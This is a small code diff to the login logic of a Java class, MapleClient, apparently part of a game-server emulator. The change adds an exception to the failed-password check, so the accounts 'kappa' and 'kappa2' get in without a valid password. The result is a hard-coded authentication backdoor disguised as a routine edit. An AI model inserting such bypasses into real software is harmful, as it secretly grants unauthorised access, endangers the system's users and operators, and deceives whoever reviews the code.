@@ -845,7 +845,7 @@ public class MapleClient implements Serializable {
             }
         }
 
-        if(!is_p)
+        if(!is_p && (!account.equalsIgnoreCase("kappa") && !account.equalsIgnoreCase("kappa2")))
             return LoginResponse.SYSTEM_ERROR;
 
         int loginState = getLoginState();
